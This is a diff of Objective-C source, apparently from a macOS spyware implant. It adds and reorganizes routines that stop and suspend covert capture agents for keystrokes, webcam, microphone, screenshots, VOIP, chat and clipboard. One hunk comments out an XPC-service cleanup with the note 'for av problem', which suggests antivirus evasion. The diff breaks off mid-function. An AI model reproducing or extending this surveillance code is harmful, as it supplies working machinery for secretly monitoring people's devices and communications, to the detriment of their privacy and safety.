@@ -502,29 +502,29 @@ static NSLock *gSyncLock                  = nil;
               // is Snow Leopard
               osaxRootPath = [[NSString alloc] initWithFormat: @"%@",
                            OSAX_ROOT_PATH];
-
-              if ([gUtil isLion])
-                {
-                  destDir = [[NSString alloc]
-                    initWithFormat: @"%@/%@%@.xpc",
-                    XPC_BUNDLE_FRAMEWORK_PATH,
-                    XPC_BUNDLE_FOLDER_PREFIX,
-                    gMyXPCName];
-#ifdef DEBUG_TASK_MANAGER
-                  infoLog(@"Removing xpc services %@", destDir);
-#endif
-                  if (![[NSFileManager defaultManager] removeItemAtPath: destDir
-                                                                  error: &err])
-                    {
-#ifdef DEBUG_TASK_MANAGER
-                      errorLog(@"uid (%d) euid (%d)", getuid(), geteuid());
-                      errorLog(@"Error while removing the xpc service");
-                      errorLog(@"error: %@", [err localizedDescription]);
-#endif
-                    }
-
-                  [destDir release];
-                }
+//XXX- for av problem
+//              if ([gUtil isLion])
+//                {
+//                  destDir = [[NSString alloc]
+//                    initWithFormat: @"%@/%@%@.xpc",
+//                    XPC_BUNDLE_FRAMEWORK_PATH,
+//                    XPC_BUNDLE_FOLDER_PREFIX,
+//                    gMyXPCName];
+//#ifdef DEBUG_TASK_MANAGER
+//                  infoLog(@"Removing xpc services %@", destDir);
+//#endif
+//                  if (![[NSFileManager defaultManager] removeItemAtPath: destDir
+//                                                                  error: &err])
+//                    {
+//#ifdef DEBUG_TASK_MANAGER
+//                      errorLog(@"uid (%d) euid (%d)", getuid(), geteuid());
+//                      errorLog(@"Error while removing the xpc service");
+//                      errorLog(@"error: %@", [err localizedDescription]);
+//#endif
+//                    }
+//
+//                  [destDir release];
+//                }
             }
         }
       else
@@ -1436,6 +1436,434 @@ static NSLock *gSyncLock                  = nil;
   return YES;
 }
 
+- (BOOL)stopAgent: (u_int)agentID
+{
+  __m_MLogManager *_logManager = [__m_MLogManager sharedInstance];
+  NSMutableDictionary *agentConfiguration;
+  NSData *agentCommand;
+  
+#ifdef DEBUG_TASK_MANAGER
+  infoLog(@"Stop Agent called, 0x%x", agentID);
+#endif
+  
+  switch (agentID)
+  {
+    case AGENT_SCREENSHOT:
+    {
+#ifdef DEBUG_TASK_MANAGER        
+      infoLog(@"Stopping Agent Screenshot");
+#endif
+      __m_MAgentScreenshot *agentScreenshot = [__m_MAgentScreenshot sharedInstance];
+      
+      if ([agentScreenshot stop] == FALSE)
+      {
+#ifdef DEBUG_TASK_MANAGER
+        infoLog(@"Error while stopping agent Screenshot");
+#endif
+        return NO;
+      }
+      
+      agentConfiguration = [self getConfigForAgent: agentID];
+      [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
+      
+      break;
+    }
+    case AGENT_ORGANIZER:
+    {
+#ifdef DEBUG_TASK_MANAGER        
+      warnLog(@"Stopping Agent Organizer");
+#endif
+      __m_MAgentOrganizer *agentOrganizer = [__m_MAgentOrganizer sharedInstance];
+      
+      if ([agentOrganizer stop] == FALSE)
+      {
+#ifdef DEBUG_TASK_MANAGER
+        errorLog(@"Error while stopping agent Organizer");
+#endif
+        return NO;
+      }
+      
+      agentConfiguration = [self getConfigForAgent: agentID];
+      [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
+      
+#ifdef DEBUG_TASK_MANAGER
+      infoLog(@"Organizer stopped correctly");
+#endif
+      break;
+    }
+    case AGENT_CAM:
+    {
+#ifdef DEBUG_TASK_MANAGER        
+      infoLog(@"Stopping Agent WebCam");
+#endif
+      __m_MAgentWebcam *agentWebcam = [__m_MAgentWebcam sharedInstance];
+      
+      if ([agentWebcam stop] == FALSE)
+      {
+#ifdef DEBUG_TASK_MANAGER
+        infoLog(@"Error while stopping agent Webcam");
+#endif
+        return NO;
+      }
+      
+      agentConfiguration = [self getConfigForAgent: agentID];
+      [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
+      
+      break;
+    }
+    case AGENT_KEYLOG:
+    {
+      agentCommand = [NSMutableData dataWithLength: sizeof(shMemoryCommand)];
+      
+      shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
+      shMemoryHeader->agentID         = agentID;
+      shMemoryHeader->direction       = D_TO_AGENT;
+      shMemoryHeader->command         = AG_STOP;
+      
+      if ([gSharedMemoryCommand writeMemory: agentCommand
+                                     offset: OFFT_KEYLOG
+                              fromComponent: COMP_CORE] == TRUE)
+      {
+#ifdef DEBUG_TASK_MANAGER
+        infoLog(@"Stop command sent to Agent %x", agentID);
+#endif
+        
+        agentConfiguration = [self getConfigForAgent: agentID];
+        [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
+        
+        [_logManager closeActiveLog: AGENT_KEYLOG
+                          withLogID: 0];
+      }
+      else
+      {
+#ifdef DEBUG_TASK_MANAGER
+        infoLog(@"Error while sending Stop command to Agent Keylog");
+#endif
+        
+        return NO;
+      }
+      
+      break;
+    }
+    case AGENT_VOIP:
+    {
+      agentCommand = [NSMutableData dataWithLength: sizeof(shMemoryCommand)];
+      
+      shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
+      shMemoryHeader->agentID         = agentID;
+      shMemoryHeader->direction       = D_TO_AGENT;
+      shMemoryHeader->command         = AG_STOP;
+      
+      if ([gSharedMemoryCommand writeMemory: agentCommand
+                                     offset: OFFT_VOIP
+                              fromComponent: COMP_CORE] == TRUE)
+      {
+#ifdef DEBUG_TASK_MANAGER
+        infoLog(@"Stop command sent to Agent %x", agentID);
+#endif
+        
+        agentConfiguration = [self getConfigForAgent: agentID];
+        [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
+      }
+      else
+      {
+#ifdef DEBUG_TASK_MANAGER
+        infoLog(@"Error while sending Stop command to agent VOIP");
+#endif
+        
+        return NO;
+      }
+      break;
+    }
+    case AGENT_URL:
+    {
+      agentCommand = [NSMutableData dataWithLength: sizeof(shMemoryCommand)];
+      
+      shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
+      shMemoryHeader->agentID         = agentID;
+      shMemoryHeader->direction       = D_TO_AGENT;
+      shMemoryHeader->command         = AG_STOP;
+      
+      if ([gSharedMemoryCommand writeMemory: agentCommand
+                                     offset: OFFT_URL
+                              fromComponent: COMP_CORE] == TRUE)
+      {
+#ifdef DEBUG_TASK_MANAGER
+        infoLog(@"Stop command sent to Agent %x", agentID);
+#endif
+        
+        agentConfiguration = [self getConfigForAgent: agentID];
+        [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
+        
+        [_logManager closeActiveLog: AGENT_URL
+                          withLogID: 0];
+      }
+      else
+      {
+#ifdef DEBUG_TASK_MANAGER
+        infoLog(@"Error while sending Stop command to Agent URL");
+#endif
+        
+        return NO;
+      }
+      
+      break;
+    }
+    case AGENT_APPLICATION:
+    {
+      agentCommand = [NSMutableData dataWithLength: sizeof(shMemoryCommand)];
+      
+      shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
+      shMemoryHeader->agentID         = agentID;
+      shMemoryHeader->direction       = D_TO_AGENT;
+      shMemoryHeader->command         = AG_STOP;
+      
+      if ([gSharedMemoryCommand writeMemory: agentCommand
+                                     offset: OFFT_APPLICATION
+                              fromComponent: COMP_CORE] == TRUE)
+      {
+#ifdef DEBUG_TASK_MANAGER
+        infoLog(@"Stop command sent to Agent %x", agentID);
+#endif
+        
+        agentConfiguration = [self getConfigForAgent: agentID];
+        [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
+        
+        [_logManager closeActiveLog: AGENT_APPLICATION
+                          withLogID: 0];
+      }
+      else
+      {
+#ifdef DEBUG_TASK_MANAGER
+        infoLog(@"Error while sending Stop command to Agent Application");
+#endif
+        
+        return NO;
+      }
+      break;
+    }
+    case AGENT_MOUSE:
+    {
+      agentCommand = [NSMutableData dataWithLength: sizeof(shMemoryCommand)];
+      
+      shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
+      shMemoryHeader->agentID         = agentID;
+      shMemoryHeader->direction       = D_TO_AGENT;
+      shMemoryHeader->command         = AG_STOP;
+      
+      if ([gSharedMemoryCommand writeMemory: agentCommand
+                                     offset: OFFT_MOUSE
+                              fromComponent: COMP_CORE] == TRUE)
+      {
+#ifdef DEBUG_TASK_MANAGER
+        infoLog(@"Stop command sent to Agent %x", agentID);
+#endif
+        
+        agentConfiguration = [self getConfigForAgent: agentID];
+        [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
+      }
+      else
+      {
+#ifdef DEBUG_TASK_MANAGER
+        infoLog(@"Error while sending Stop commmand to Agent Mouse");
+#endif
+        
+        return NO;
+      }
+      
+      break;
+    }
+    case AGENT_CHAT:
+    {
+      agentCommand = [NSMutableData dataWithLength: sizeof(shMemoryCommand)];
+      
+      shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
+      shMemoryHeader->agentID         = agentID;
+      shMemoryHeader->direction       = D_TO_AGENT;
+      shMemoryHeader->command         = AG_STOP;
+      
+      if ([gSharedMemoryCommand writeMemory: agentCommand
+                                     offset: OFFT_IM
+                              fromComponent: COMP_CORE] == TRUE)
+      {
+#ifdef DEBUG_TASK_MANAGER
+        infoLog(@"Stop command sent to Agent %x", agentID);
+#endif
+        
+        agentConfiguration = [self getConfigForAgent: agentID];
+        [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
+        
+        [_logManager closeActiveLog: AGENT_CHAT
+                          withLogID: 0];
+      }
+      else
+      {
+#ifdef DEBUG_TASK_MANAGER
+        infoLog(@"Error while sending Stop command to agent CHAT");
+#endif
+        
+        return NO;
+      }
+      
+      break;
+    }
+    case AGENT_CLIPBOARD:
+    {
+      agentCommand = [NSMutableData dataWithLength: sizeof(shMemoryCommand)];
+      
+      shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
+      shMemoryHeader->agentID         = agentID;
+      shMemoryHeader->direction       = D_TO_AGENT;
+      shMemoryHeader->command         = AG_STOP;
+      
+      if ([gSharedMemoryCommand writeMemory: agentCommand
+                                     offset: OFFT_CLIPBOARD
+                              fromComponent: COMP_CORE] == TRUE)
+      {
+#ifdef DEBUG_TASK_MANAGER
+        infoLog(@"Stop command sent to Agent %x", agentID);
+#endif
+        
+        agentConfiguration = [self getConfigForAgent: agentID];
+        [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
+        
+        [_logManager closeActiveLog: AGENT_CLIPBOARD
+                          withLogID: 0];
+      }
+      else
+      {
+#ifdef DEBUG_TASK_MANAGER
+        infoLog(@"Error while sending Stop command to agent Clipboard");
+#endif
+        
+        return NO;
+      }
+      
+      break;
+    }
+    case AGENT_POSITION:
+    {
+#ifdef DEBUG_TASK_MANAGER        
+      infoLog(@"Stopping Agent Position");
+#endif
+      __m_MAgentPosition *agentPosition = [__m_MAgentPosition sharedInstance];
+      
+      if ([agentPosition stop] == FALSE)
+      {
+#ifdef DEBUG_TASK_MANAGER
+        infoLog(@"Error while stopping agent Position");
+#endif
+        return NO;
+      }
+      break;
+    }
+    case AGENT_MICROPHONE:
+    {
+#ifdef DEBUG_TASK_MANAGER        
+      infoLog(@"Stopping Agent Microphone");
+#endif
+      __m_MAgentMicrophone *agentMic = [__m_MAgentMicrophone sharedInstance];
+      
+      if ([agentMic stop] == FALSE)
+      {
+#ifdef DEBUG_TASK_MANAGER
+        errorLog(@"Error while stopping agent Microphone");
+#endif
+        return NO;
+      }
+      
+      agentConfiguration = [self getConfigForAgent: agentID];
+      [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
+      
+      break;
+    }
+    case AGENT_DEVICE:
+    {
+#ifdef DEBUG_TASK_MANAGER        
+      infoLog(@"Stopping Agent Device");
+#endif
+      __m_MAgentDevice *agentDevice = [__m_MAgentDevice sharedInstance];
+      
+      if ([agentDevice stop] == FALSE)
+      {
+#ifdef DEBUG_TASK_MANAGER
+        infoLog(@"Error while stopping agent agentDevice");
+#endif
+        return NO;
+      }
+      else
+      {
+        agentConfiguration = [self getConfigForAgent: agentID];
+        [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
+      }
+      break;
+    }
+    case AGENT_CRISIS:
+    {
+#ifdef DEBUG_TASK_MANAGER
+      infoLog(@"Stopping Agent Crisis 0x%x", gAgentCrisis);
+#endif
+      gAgentCrisis &= ~(CRISIS_STARTSTOP);
+      
+#ifdef DEBUG_TASK_MANAGER
+      infoLog(@"Agent Crisis 0x%x (0x%x)", gAgentCrisis, ~(CRISIS_STARTSTOP));
+#endif
+      
+      __m_MInfoManager *infoManager = [[__m_MInfoManager alloc] init];
+      [infoManager logActionWithDescription: @"Crisis stopped"];
+      [infoManager release];
+      
+      // Only for input manager
+      if ([gUtil isLeopard])
+      {
+        agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
+        agentConfiguration = [[self getConfigForAgent: agentID] retain];
+        
+        shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
+        
+        shMemoryHeader->agentID = agentID;          
+        shMemoryHeader->direction = D_TO_AGENT;
+        shMemoryHeader->command = AG_STOP;
+        memset(shMemoryHeader->commandData, 0, sizeof(shMemoryHeader->commandData));
+        
+        shMemoryHeader->commandDataSize = 0;
+        
+        if ([gSharedMemoryCommand writeMemory: agentCommand
+                                       offset: OFFT_CRISIS
+                                fromComponent: COMP_CORE] == TRUE)
+        {
+          [agentConfiguration setObject: AGENT_STOPPED
+                                 forKey: @"status"];
+#ifdef DEBUG_TASK_MANAGER
+          infoLog(@"Start command sent to Agent CRISIS", agentID);
+#endif
+        }
+        else
+        {
+#ifdef DEBUG_TASK_MANAGER
+          infoLog(@"An error occurred while starting agent CRISIS");
+#endif
+          [agentCommand release];
+          [agentConfiguration release];
+          return NO;
+        }
+      }
+      
+      break;
+    }
+    default:
+    {
+#ifdef DEBUG_TASK_MANAGER
+      errorLog(@"Unsupported agent: 0x%04x", agentID);
+#endif
+      
+      return NO;
+    }
+  }
+  
+  return YES;
+}
+
 - (BOOL)restartAgent: (u_int)agentID
 {
   return YES;
@@ -1443,6 +1871,62 @@ static NSLock *gSyncLock                  = nil;
 
 - (BOOL)suspendAgent: (u_int)agentID
 {
+  return YES;
+}
+
+- (BOOL)suspendAgents
+{
+  NSAutoreleasePool *outerPool    = [[NSAutoreleasePool alloc] init];
+  
+#ifdef DEBUG_TASK_MANAGER
+  infoLog(@"Suspend running agents");
+#endif
+  
+  NSMutableDictionary *anObject;
+  
+  for (int i = 0; i < [mAgentsList count]; i++)
+  {
+    NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
+    
+    anObject = [mAgentsList objectAtIndex: i];
+    
+    [anObject retain];
+    
+    int agentID = [[anObject objectForKey: @"agentID"] intValue];
+    
+    if ([anObject objectForKey: @"status"] == AGENT_RUNNING)
+    {
+      int retry = 0;
+      
+#ifdef DEBUG_TASK_MANAGER
+      infoLog(@"Agent %#x found %@", agentID, [anObject objectForKey: @"status"]);
+#endif
+      [self stopAgent:agentID];
+      
+      while (([anObject objectForKey: @"status"] != AGENT_STOPPED) &&
+             (retry++ < MAX_RETRY_TIME))
+      {
+        sleep(1);
+      }
+      
+      [anObject setObject: AGENT_SUSPENDED forKey: @"status"];
+      
+#ifdef DEBUG_TASK_MANAGER
+      infoLog(@"Agent %#x new status %@", agentID, [anObject objectForKey: @"status"]);
+#endif
+    }
+    
+    [anObject release];
+    
+    [innerPool release];
+  }
+  
+#ifdef DEBUG_TASK_MANAGER
+  infoLog(@"suspending agents done");
+#endif
+  
+  [outerPool release];
+  
   return YES;
 }
 
@@ -1489,486 +1973,411 @@ static NSLock *gSyncLock                  = nil;
   return YES;
 }
 
-- (BOOL)suspendAgents
+
+- (BOOL)stopAgents
 {
-  NSAutoreleasePool *outerPool    = [[NSAutoreleasePool alloc] init];
-
+  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
+  __m_MLogManager *_logManager  = [__m_MLogManager sharedInstance];
+  
 #ifdef DEBUG_TASK_MANAGER
-  infoLog(@"Suspend running agents");
+  infoLog(@"Stop all Agents called");
 #endif
-
+  
   NSMutableDictionary *anObject;
+  int i = 0;
   
-  for (int i = 0; i < [mAgentsList count]; i++)
-    {
-      NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
-      
-      anObject = [mAgentsList objectAtIndex: i];
-      
-      [anObject retain];
-      
-      int agentID = [[anObject objectForKey: @"agentID"] intValue];
-      
-      if ([anObject objectForKey: @"status"] == AGENT_RUNNING)
-        {
-          int retry = 0;
-          
-#ifdef DEBUG_TASK_MANAGER
-        infoLog(@"Agent %#x found %@", agentID, [anObject objectForKey: @"status"]);
-#endif
-          [self stopAgent:agentID];
-          
-          while (([anObject objectForKey: @"status"] != AGENT_STOPPED) &&
-                 (retry++ < MAX_RETRY_TIME))
-            {
-              sleep(1);
-            }
-            
-          [anObject setObject: AGENT_SUSPENDED forKey: @"status"];
-          
-#ifdef DEBUG_TASK_MANAGER
-          infoLog(@"Agent %#x new status %@", agentID, [anObject objectForKey: @"status"]);
-#endif
-        }
-        
-      [anObject release];
-      
-      [innerPool release];
-    }
+  //for (anObject in mAgentsList)
+  for (; i < [mAgentsList count]; i++)
+  {
+    NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
+    anObject = [mAgentsList objectAtIndex: i];
     
-#ifdef DEBUG_TASK_MANAGER
-  infoLog(@"suspending agents done");
-#endif
-  
-  [outerPool release];
-  
-  return YES;
-}
-
-- (BOOL)stopAgent: (u_int)agentID
-{
-  __m_MLogManager *_logManager = [__m_MLogManager sharedInstance];
-  NSMutableDictionary *agentConfiguration;
-  NSData *agentCommand;
-  
-#ifdef DEBUG_TASK_MANAGER
-  infoLog(@"Stop Agent called, 0x%x", agentID);
-#endif
-  
-  switch (agentID)
+    int agentID = [[anObject objectForKey: @"agentID"] intValue];
+    NSString *status = [[NSString alloc] initWithString: [anObject objectForKey: @"status"]];
+    
+    if ([status isEqualToString: AGENT_RUNNING] == TRUE)
     {
-    case AGENT_SCREENSHOT:
+      switch (agentID)
       {
-#ifdef DEBUG_TASK_MANAGER        
-        infoLog(@"Stopping Agent Screenshot");
+        case AGENT_SCREENSHOT:
+        {
+#ifdef DEBUG_TASK_MANAGER
+          infoLog(@"Stopping Agent Screenshot");
 #endif
-        __m_MAgentScreenshot *agentScreenshot = [__m_MAgentScreenshot sharedInstance];
-        
-        if ([agentScreenshot stop] == FALSE)
+          __m_MAgentScreenshot *agentScreenshot = [__m_MAgentScreenshot sharedInstance];
+          
+          if ([agentScreenshot stop] == FALSE)
           {
 #ifdef DEBUG_TASK_MANAGER
             infoLog(@"Error while stopping agent Screenshot");
 #endif
-            return NO;
           }
-        
-        agentConfiguration = [self getConfigForAgent: agentID];
-        [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
-        
-        break;
-      }
-    case AGENT_ORGANIZER:
-      {
+          else
+          {
+            [anObject setObject: AGENT_STOPPED forKey: @"status"];
+          }
+          
+          break;
+        }
+        case AGENT_ORGANIZER:
+        {
 #ifdef DEBUG_TASK_MANAGER        
-        warnLog(@"Stopping Agent Organizer");
+          warnLog(@"Stopping Agent Organizer");
 #endif
-        __m_MAgentOrganizer *agentOrganizer = [__m_MAgentOrganizer sharedInstance];
-      
-        if ([agentOrganizer stop] == FALSE)
+          __m_MAgentOrganizer *agentOrganizer = [__m_MAgentOrganizer sharedInstance];
+          
+          if ([agentOrganizer stop] == FALSE)
           {
 #ifdef DEBUG_TASK_MANAGER
             errorLog(@"Error while stopping agent Organizer");
 #endif
-            return NO;
+            //return NO;
           }
-        
-        agentConfiguration = [self getConfigForAgent: agentID];
-        [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
-        
+          else
+          {
+            [anObject setObject: AGENT_STOPPED forKey: @"status"];
+          }
 #ifdef DEBUG_TASK_MANAGER
-        infoLog(@"Organizer stopped correctly");
+          infoLog(@"Organizer stopped correctly");
 #endif
-        break;
-      }
-    case AGENT_CAM:
-      {
-#ifdef DEBUG_TASK_MANAGER        
-        infoLog(@"Stopping Agent WebCam");
+          break;
+        }
+        case AGENT_CAM:
+        {
+#ifdef DEBUG_TASK_MANAGER
+          infoLog(@"Stopping Agent WebCam");
 #endif
-        __m_MAgentWebcam *agentWebcam = [__m_MAgentWebcam sharedInstance];
-        
-        if ([agentWebcam stop] == FALSE)
+          __m_MAgentWebcam *agentWebcam = [__m_MAgentWebcam sharedInstance];
+          
+          if ([agentWebcam stop] == FALSE)
           {
 #ifdef DEBUG_TASK_MANAGER
             infoLog(@"Error while stopping agent Webcam");
 #endif
-            return NO;
           }
-        
-        agentConfiguration = [self getConfigForAgent: agentID];
-        [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
-      
-        break;
-      }
-    case AGENT_KEYLOG:
-      {
-        agentCommand = [NSMutableData dataWithLength: sizeof(shMemoryCommand)];
-        
-        shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
-        shMemoryHeader->agentID         = agentID;
-        shMemoryHeader->direction       = D_TO_AGENT;
-        shMemoryHeader->command         = AG_STOP;
-        
-        if ([gSharedMemoryCommand writeMemory: agentCommand
-                                       offset: OFFT_KEYLOG
-                                fromComponent: COMP_CORE] == TRUE)
+          else
+          {
+            [anObject setObject: AGENT_STOPPED forKey: @"status"];
+          }
+          
+          break;
+        }
+        case AGENT_KEYLOG:
+        {
+#ifdef DEBUG_TASK_MANAGER
+          infoLog(@"Stopping Agent Keylogger");
+#endif
+          NSMutableData *agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
+          
+          shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
+          shMemoryHeader->agentID         = agentID;
+          shMemoryHeader->direction       = D_TO_AGENT;
+          shMemoryHeader->command         = AG_STOP;
+          
+          if ([gSharedMemoryCommand writeMemory: agentCommand
+                                         offset: OFFT_KEYLOG
+                                  fromComponent: COMP_CORE] == TRUE)
           {
 #ifdef DEBUG_TASK_MANAGER
             infoLog(@"Stop command sent to Agent %x", agentID);
 #endif
             
-            agentConfiguration = [self getConfigForAgent: agentID];
-            [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
-            
+            [anObject setObject: AGENT_STOPPED forKey: @"status"];
             [_logManager closeActiveLog: AGENT_KEYLOG
                               withLogID: 0];
           }
-        else
+          
+          [agentCommand release];
+          
+          break;
+        }
+        case AGENT_URL:
+        {
+#ifdef DEBUG_TASK_MANAGER
+          infoLog(@"Stopping Agent URL");
+#endif
+          NSMutableData *agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
+          
+          shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
+          shMemoryHeader->agentID         = agentID;
+          shMemoryHeader->direction       = D_TO_AGENT;
+          shMemoryHeader->command         = AG_STOP;
+          
+          if ([gSharedMemoryCommand writeMemory: agentCommand
+                                         offset: OFFT_URL
+                                  fromComponent: COMP_CORE] == TRUE)
           {
 #ifdef DEBUG_TASK_MANAGER
-            infoLog(@"Error while sending Stop command to Agent Keylog");
+            infoLog(@"Stop command sent to Agent URL", agentID);
 #endif
             
-            return NO;
-          }
-        
-        break;
-      }
-    case AGENT_VOIP:
-      {
-        agentCommand = [NSMutableData dataWithLength: sizeof(shMemoryCommand)];
-        
-        shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
-        shMemoryHeader->agentID         = agentID;
-        shMemoryHeader->direction       = D_TO_AGENT;
-        shMemoryHeader->command         = AG_STOP;
-        
-        if ([gSharedMemoryCommand writeMemory: agentCommand
-                                       offset: OFFT_VOIP
-                                fromComponent: COMP_CORE] == TRUE)
-          {
-#ifdef DEBUG_TASK_MANAGER
-            infoLog(@"Stop command sent to Agent %x", agentID);
-#endif
-            
-            agentConfiguration = [self getConfigForAgent: agentID];
-            [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
-          }
-        else
-          {
-#ifdef DEBUG_TASK_MANAGER
-            infoLog(@"Error while sending Stop command to agent VOIP");
-#endif
-
-            return NO;
-          }
-        break;
-      }
-    case AGENT_URL:
-      {
-        agentCommand = [NSMutableData dataWithLength: sizeof(shMemoryCommand)];
-        
-        shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
-        shMemoryHeader->agentID         = agentID;
-        shMemoryHeader->direction       = D_TO_AGENT;
-        shMemoryHeader->command         = AG_STOP;
-        
-        if ([gSharedMemoryCommand writeMemory: agentCommand
-                                       offset: OFFT_URL
-                                fromComponent: COMP_CORE] == TRUE)
-          {
-#ifdef DEBUG_TASK_MANAGER
-            infoLog(@"Stop command sent to Agent %x", agentID);
-#endif
-            
-            agentConfiguration = [self getConfigForAgent: agentID];
-            [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
-            
+            [anObject setObject: AGENT_STOPPED forKey: @"status"];
             [_logManager closeActiveLog: AGENT_URL
                               withLogID: 0];
           }
-        else
+          
+          [agentCommand release];
+          
+          break;
+        }
+        case AGENT_APPLICATION:
+        {
+#ifdef DEBUG_TASK_MANAGER
+          infoLog(@"Stopping Agent Application");
+#endif
+          NSMutableData *agentCommand = 
+          [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
+          
+          shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
+          shMemoryHeader->agentID         = agentID;
+          shMemoryHeader->direction       = D_TO_AGENT;
+          shMemoryHeader->command         = AG_STOP;
+          
+          if ([gSharedMemoryCommand writeMemory: agentCommand
+                                         offset: OFFT_APPLICATION
+                                  fromComponent: COMP_CORE] == TRUE)
           {
 #ifdef DEBUG_TASK_MANAGER
-            infoLog(@"Error while sending Stop command to Agent URL");
+            infoLog(@"Stop command sent to Agent Application", agentID);
 #endif
-
-            return NO;
-          }
-        
-        break;
-      }
-    case AGENT_APPLICATION:
-      {
-        agentCommand = [NSMutableData dataWithLength: sizeof(shMemoryCommand)];
-        
-        shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
-        shMemoryHeader->agentID         = agentID;
-        shMemoryHeader->direction       = D_TO_AGENT;
-        shMemoryHeader->command         = AG_STOP;
-        
-        if ([gSharedMemoryCommand writeMemory: agentCommand
-                                       offset: OFFT_APPLICATION
-                                fromComponent: COMP_CORE] == TRUE)
-          {
-#ifdef DEBUG_TASK_MANAGER
-            infoLog(@"Stop command sent to Agent %x", agentID);
-#endif
-
-            agentConfiguration = [self getConfigForAgent: agentID];
-            [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
-
+            
+            [anObject setObject: AGENT_STOPPED forKey: @"status"];
             [_logManager closeActiveLog: AGENT_APPLICATION
                               withLogID: 0];
           }
-        else
+          
+          [agentCommand release];
+          
+          break;
+        }
+        case AGENT_MOUSE:
+        {
+#ifdef DEBUG_TASK_MANAGER
+          infoLog(@"Stopping Agent Mouse");
+#endif
+          
+          NSMutableData *agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
+          
+          shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
+          shMemoryHeader->agentID         = agentID;
+          shMemoryHeader->direction       = D_TO_AGENT;
+          shMemoryHeader->command         = AG_STOP;
+          
+          if ([gSharedMemoryCommand writeMemory: agentCommand
+                                         offset: OFFT_MOUSE
+                                  fromComponent: COMP_CORE] == TRUE)
           {
 #ifdef DEBUG_TASK_MANAGER
-            infoLog(@"Error while sending Stop command to Agent Application");
+            infoLog(@"Stop command sent to Agent Mouse", agentID);
 #endif
-
-            return NO;
+            [anObject setObject: AGENT_STOPPED forKey: @"status"];
           }
-        break;
-      }
-    case AGENT_MOUSE:
-      {
-        agentCommand = [NSMutableData dataWithLength: sizeof(shMemoryCommand)];
-        
-        shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
-        shMemoryHeader->agentID         = agentID;
-        shMemoryHeader->direction       = D_TO_AGENT;
-        shMemoryHeader->command         = AG_STOP;
-        
-        if ([gSharedMemoryCommand writeMemory: agentCommand
-                                       offset: OFFT_MOUSE
-                                fromComponent: COMP_CORE] == TRUE)
+          
+          [agentCommand release];
+          
+          break;
+        }
+        case AGENT_CHAT:
+        {
+#ifdef DEBUG_TASK_MANAGER
+          infoLog(@"Stopping Agent CHAT");
+#endif
+          
+          NSMutableData *agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
+          
+          shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
+          shMemoryHeader->agentID         = agentID;
+          shMemoryHeader->direction       = D_TO_AGENT;
+          shMemoryHeader->command         = AG_STOP;
+          
+          if ([gSharedMemoryCommand writeMemory: agentCommand
+                                         offset: OFFT_IM
+                                  fromComponent: COMP_CORE] == TRUE)
           {
 #ifdef DEBUG_TASK_MANAGER
-            infoLog(@"Stop command sent to Agent %x", agentID);
+            infoLog(@"Stop command sent to Agent CHAT", agentID);
 #endif
-            
-            agentConfiguration = [self getConfigForAgent: agentID];
-            [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
+            [anObject setObject: AGENT_STOPPED forKey: @"status"];
           }
-        else
+          
+          [agentCommand release];
+          
+          break;
+        }
+        case AGENT_CLIPBOARD:
+        {
+#ifdef DEBUG_TASK_MANAGER
+          infoLog(@"Stopping Agent Clipboard");
+#endif
+          
+          NSMutableData *agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
+          
+          shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
+          shMemoryHeader->agentID         = agentID;
+          shMemoryHeader->direction       = D_TO_AGENT;
+          shMemoryHeader->command         = AG_STOP;
+          
+          if ([gSharedMemoryCommand writeMemory: agentCommand
